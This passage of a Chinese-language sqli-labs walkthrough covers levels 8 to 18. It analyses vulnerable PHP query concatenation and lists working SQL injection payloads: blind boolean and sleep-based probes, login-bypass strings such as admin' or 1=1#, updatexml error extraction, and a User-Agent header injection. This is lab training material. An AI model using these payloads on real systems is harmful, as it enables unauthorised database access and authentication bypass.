+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;s&#39;</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(),2)&gt;&#39;</span><span class="n">sd</span><span class="s1">&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;se&#39;</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-9">Less-9</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-7 注入方式一致，只是拼接方式不一样</p>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 使用单引号拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 支持延时盲注
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">in</span><span class="o">............</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">in</span><span class="o">...........</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nf">ascii</span><span class="p">(</span><span class="nf">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">115</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="nf">ascii</span><span class="p">(</span><span class="nf">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">101</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">...</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-10">Less-10</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>延时盲注</td>
+<td><code>id=&quot;$id&quot;</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 先使用双引号再直接拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="si">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 支持延时盲注
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">in</span><span class="o">............</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出</span> <span class="nx">You</span> <span class="nx">are</span> <span class="nx">in</span><span class="o">...........</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p>
+<h2 id="less-11">Less-11</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>username='x'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># POST 方式接受变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用单引号拼接 SQL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=&#39;</span><span class="si">$uname</span><span class="s2">&#39; and password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出查询的信息</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p>
+<h3 id="万能密码">万能密码</h3>
+<p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+----------+----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+----------+----------+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">admin</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+----+----------+----------+</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1"># 注释掉 passwd 来登录</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uname</span><span class="o">=</span>admin<span class="s1">&#39; or 1=1#&amp;passwd=&amp;submit=Submit
+</span></span></span><span class="line"><span class="cl"><span class="s1">uname=admin&#39;</span><span class="c1">#&amp;passwd=&amp;submit=Submit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 注释后面语句 并 添加一个永真条件</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uname</span><span class="o">=</span>admin<span class="p">&amp;</span><span class="nv">passwd</span><span class="o">=</span>1<span class="s1">&#39; or 1#&amp;submit=Submit
+</span></span></span><span class="line"><span class="cl"><span class="s1">uname=admin&amp;passwd=1&#39;</span><span class="o">||</span>1#<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Submit
+</span></span><span class="line"><span class="cl"><span class="nv">uname</span><span class="o">=</span>admin<span class="p">&amp;</span><span class="nv">passwd</span><span class="o">=</span>1<span class="s1">&#39; or 1#&amp;submit=Submit
+</span></span></span><span class="line"><span class="cl"><span class="s1">uname=admin&amp;passwd=1&#39;</span><span class="o">||</span>1#<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Submit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 闭合后面语句 并 添加一个永真条件</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uname</span><span class="o">=</span>admin<span class="p">&amp;</span><span class="nv">passwd</span><span class="o">=</span>1<span class="s1">&#39;or&#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Submit
+</span></span><span class="line"><span class="cl"><span class="nv">uname</span><span class="o">=</span>admin<span class="p">&amp;</span><span class="nv">passwd</span><span class="o">=</span>1<span class="s1">&#39;||&#39;</span>1<span class="s1">&#39;=&#39;</span>1<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span>Submit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p>
+</blockquote>
+<h2 id="less-12">Less-12</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>username=(&quot;x&quot;)</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p>
+<h2 id="less-13">Less-13</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>username=('x')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>简单源码分析</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># POST 方式接受变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用单引号和括号来拼接 SQL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(&#39;</span><span class="si">$uname</span><span class="s2">&#39;) and password=(&#39;</span><span class="si">$passwd</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">并没有输出啥信息</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p>
+<h2 id="less-14">Less-14</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>username=&quot;x&quot;</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>简单源码分析</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 先使用 双引号 再直接带入 SQL 语句
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=</span><span class="si">$uname</span><span class="s2"> and password=</span><span class="si">$passwd</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p>
+<h2 id="less-15">Less-15</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>username='x'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p>
+<p>这里不再做重复无意义的记录了。</p>
+<h2 id="less-16">Less-16</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>username=(&quot;x&quot;)</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p>
+<h2 id="less-17">Less-17</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>password = '$passwd'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>简单源码分析</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># uname 参数被过滤了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username= </span><span class="si">$uname</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">select</span> <span class="nx">结果正确</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 更新语句 使用单引号拼接 passwd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$update</span><span class="o">=</span><span class="s2">&#34;UPDATE users SET password = &#39;</span><span class="si">$passwd</span><span class="s2">&#39; WHERE username=&#39;</span><span class="si">$row1</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">mysql</span> <span class="nx">报错</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="nv">uname</span><span class="o">=</span>admin<span class="p">&amp;</span><span class="nv">passwd</span><span class="o">=</span>1<span class="err">&#39;</span> and updatexml<span class="o">(</span>1,concat<span class="o">(</span>0x7e,<span class="o">(</span><span class="k">select</span> database<span class="o">())</span>,0x7e<span class="o">)</span>,1<span class="o">)</span><span class="c1">#&amp;submit=Submit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-18">Less-18</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>VALUES ('$uagent')</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>简单源码分析</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 获取请求的 uagent 和 ip 地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uagent</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IP</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">输入了uname</span> <span class="nx">和</span> <span class="nx">passwd</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 对这两个参数进行过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT  users.username, users.password FROM users WHERE users.username=</span><span class="si">$uname</span><span class="s2"> and users.password=</span><span class="si">$passwd</span><span class="s2"> ORDER BY users.id DESC LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">SQL语句有返回结果</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$insert</span><span class="o">=</span><span class="s2">&#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;</span><span class="si">$uagent</span><span class="s2">&#39;, &#39;</span><span class="si">$IP</span><span class="s2">&#39;, </span><span class="si">$uname</span><span class="s2">)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">输出</span> <span class="nv">$uagent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p>
+<p><strong>PHP 里用来获取客户端 IP 的变量</strong></p>
+<ul>
+<li><code>$_SERVER['HTTP_CLIENT_IP']</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li>
+<li><code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>，客户端可以伪造。</li>
+<li><code>$_SERVER['REMOTE_ADDR']</code>，客户端不能伪造。</li>
+</ul>
+<p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p>
+<p>首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Http" data-lang="Http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/Less-18/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">sqli.pl</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">1&#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#39;1&#39;=&#39;1</span>
